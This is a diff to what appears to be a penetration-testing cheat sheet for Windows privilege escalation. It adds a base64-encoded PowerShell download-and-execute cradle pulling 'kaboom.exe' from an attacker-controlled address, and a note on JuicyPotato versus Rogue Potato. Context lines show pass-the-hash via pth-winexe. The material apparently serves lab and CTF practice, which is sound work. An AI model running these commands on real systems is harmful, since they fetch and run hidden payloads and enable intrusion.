@@ -709,6 +709,10 @@ https://github.com/api0cradle/UltimateAppLockerByPassList
 pth-winexe -U user%<LM Hash>:<NT Hash> //$RHOST cmd
 ```
 
+**Encode and run encoded powershell command:**\
+Encode: ```echo "IEX( IWR http://10.10.14.x:6969/kaboom.exe -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0``` \
+Run encoded command: ```powershell -EncodedCommand $B64_ENCODED_COMMAND```
+
 **To view Access Control List of a directory:**
 ```Get-ACL $FILEPATH | fl *```
 
@@ -775,7 +779,8 @@ Check if any of these access tokens are enabled:
 SeImpersonatePrivilege: can be exploited with rottenpotato, juicypotato\
 SeAssignPrimaryPrivilege: can be exploited rottenpotato, juicypotato\
 SeBackupPrivilege: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\
-etc.
+etc. \
+JuicyPotato won't work with Windows 10 1809 and Windows Server 2019 and above. Try Rogue Potato instead.
 
 If Windows 7 is detected, check for potential Eternal Blue or Kernel Exploit.
 
